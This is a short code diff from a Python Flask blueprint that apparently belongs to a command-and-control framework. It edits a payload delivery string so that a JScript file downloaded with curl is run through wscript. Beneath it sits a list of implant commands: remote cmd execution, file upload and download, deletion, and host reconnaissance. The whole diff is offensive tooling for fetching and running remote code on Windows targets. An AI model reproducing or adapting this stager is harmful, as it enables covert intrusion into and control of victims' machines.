@@ -5,7 +5,7 @@ from flask import Blueprint, render_template, request
 jscript = Blueprint('jscript', __name__, template_folder='resources')
 endpoint = digit_identifier()
 artifact = string_identifier()
-delivery = f'curl ~endpoint~ -o {artifact}.js && {artifact}.js'
+delivery = f'curl ~endpoint~ -o {artifact}.js && wscript /e:jscript {artifact}.js'
 commands = 'delay,dir,hostname,whoami,os,cmd,delfile,download,upload'
 
 
